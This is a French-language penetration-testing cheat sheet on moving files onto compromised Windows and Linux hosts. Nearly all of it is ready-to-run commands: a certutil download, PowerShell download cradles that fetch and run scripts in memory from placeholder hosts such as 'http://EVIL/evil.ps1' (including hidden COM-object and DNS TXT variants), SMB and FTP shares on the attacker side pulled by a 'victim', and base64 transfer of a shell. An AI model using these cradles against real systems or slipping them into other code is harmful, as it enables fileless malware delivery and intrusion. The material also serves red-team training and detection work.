---
public: true # set to true to make the article publishable
---
## HTTP

### LOLBAS

```shell title="Téléchargement d'un fichier à l'aide de certutil"
certutil.exe -urlcache -split -f "http://10.10.14.149:1234/RunasCS.exe" RunasCS.exe

```

```

### Powershell

```powershell title=enregistrement du fichier
powershell.exe (Invoke-WebRequest 'http://192.168.1.2/exploit.exe' -OutFile 'exploit.exe')

powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2/exploit.exe', 'exploit.exe')

```

```powershell title=exécution directe d'un script powershell en mémoire (fileless)
# si besoin d'accepter des certificats autosignés :
# [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.2/exploit.ps1')

iwr 'http://192.168.1.2/exploit.ps1' -UseBasicParsing | IEX
```

### Variantes

```powershell
## from https://gist.github.com/HarmJ0y/bb48307ffa663256e239
# normal download cradle
IEX (New-Object Net.Webclient).downloadstring("http://EVIL/evil.ps1")

# PowerShell 3.0+
IEX (iwr 'http://EVIL/evil.ps1')

# hidden IE com object
$ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://EVIL/evil.ps1');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r

# Msxml2.XMLHTTP COM object
$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText

# WinHttp COM object (not proxy aware!)
$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText

# using bitstransfer- touches disk!
Import-Module bitstransfer;Start-BitsTransfer 'http://EVIL/evil.ps1' $env:temp\t;$r=gc $env:temp\t;rm $env:temp\t; iex $r

# DNS TXT approach from PowerBreach (https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerBreach/PowerBreach.ps1)
#   code to execute needs to be a base64 encoded string stored in a TXT record
IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((nslookup -querytype=txt "SERVER" | Select -Pattern '"*"') -split '"'[0]))))

# from @subtee - https://gist.github.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d
<#
<?xml version="1.0"?>
<command>
   <a>
      <execute>Get-Process</execute>
   </a>
  </command>
#>
$a = New-Object System.Xml.XmlDocument
$a.Load("https://gist.githubusercontent.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d/raw/1ffde429dc4a05f7bc7ffff32017a3133634bc36/gistfile1.txt")
$a.command.a.execute | iex
```

## SMB

```
attacker> sudo smbserver.py myshare ./ -smb2support
attacker> sudo smbserver.py myshare ./ -smb2support -user rebrec -password blah
victim> net use x: \\<ATACKER_IP>\myshare /user rebrec blah
# 
$username = 'rebrec'
$password = 'rebrec'
$secpassword = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
New-PSDrive -Name "S" -Root "\\192.168.10.10\Common" -PSProvider "FileSystem" -Credential $cred
```

## FTP

```
# installation
pip3 install pyftpdlib

# lancement du serveur dans le dossier courant
sudo python3 -m pyftpdlib --port 21

# téléchargement depuis la victime
PS> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')
```

## Transfert de tous les fichiers d'un dossier

```
# on lance un listener HTTP sur la machine où se trouve le dossier à copier
python -m http.server 8001

# on récupère tous les fichiers 
wget -r http://$TARGET_IP:8001
wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
```

## Base 64

```
# si on veut transférer le fichier shell
base64 shell -w 0
# on copie le résultat dans le presse papier
# puis on le colle dans la machine distante
$ echo xxxxxxxxxxxxxxxxxxx | base64 -d > shell
```

#### Windows

```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```
